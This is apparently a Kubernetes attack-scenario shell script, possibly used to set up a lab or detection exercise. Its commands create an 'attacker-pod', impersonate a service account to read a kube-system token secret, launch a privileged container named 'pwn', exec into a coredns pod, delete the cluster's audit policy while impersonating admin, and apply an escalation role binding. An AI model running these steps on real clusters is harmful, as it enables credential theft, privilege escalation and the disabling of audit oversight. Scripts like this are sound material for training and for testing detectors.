#!/bin/bash

kubectl create ns secure-ops
kubectl config set-context --current --namespace=secure-ops
for _ in $(seq 1 30); do
  kubectl get sa default >/dev/null 2>&1 && break
  sleep 1
done

kubectl create sa monitoring
kubectl run attacker-pod --image=alpine --command -- sleep 3600
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

kubectl exec -n kube-system $(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1) -- cat /etc/resolv.conf

kubectl delete -f /etc/kubernetes/audit-policy.yaml --as=admin

dir="$(cd "$(dirname "$0")" && pwd)"
kubectl apply -f "$dir/escalate-binding.yaml"
